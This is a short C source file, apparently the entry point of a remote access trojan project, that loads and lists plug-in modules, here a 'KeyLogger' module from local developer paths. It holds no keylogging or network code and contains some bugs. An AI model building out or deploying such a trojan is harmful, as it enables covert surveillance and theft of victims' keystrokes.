#ifndef SUSRAT_RAT
#define SUSRAT_RAT
#include "rat.h"

void
list_modules(void) {
	int i;
	Module *mod;
	write(1, "Modules:", strlen("Modules:"));
	write(1, "\n", 1);

	for (i = 0; i < _modules_size; ++i) {
		mod = modules[_modules_size - 1];

		write(1, "\t", 1);
		write(1, mod->name, strlen(mod->name));
		write(1, "\n", 1);
	}
	write(1, "\n", 1);
}

void
load_all_modules(char *mods[], char *mod_path) {
	char **mod_name = mods;
	while (*mod_name != NULL) {
		load_module(*mod_name, mod_path);
		*mod_name++;
	}
}

int main(void) {

#ifdef _WIN32
	char *mod_path = "D:\\ran\\Git Projects\\modules\\KeyLogger\\x64\\Debug\\";
#else
#ifdef linux
	char *mod_path = "/home/venus/projects/rat/modules/";
#endif
#endif

	char *mods[] = {
		"KeyLogger",
		NULL
	};

	load_all_modules(mods, mod_path);
	list_modules();
	clean_modules();
	/*
	* Debug code until we write the client

	char command[COMMAND_SIZE];

	while (1) {
	fgets( command, COMMAND_SIZE, stdin );

	}
	*/

	return 0;
}
#endif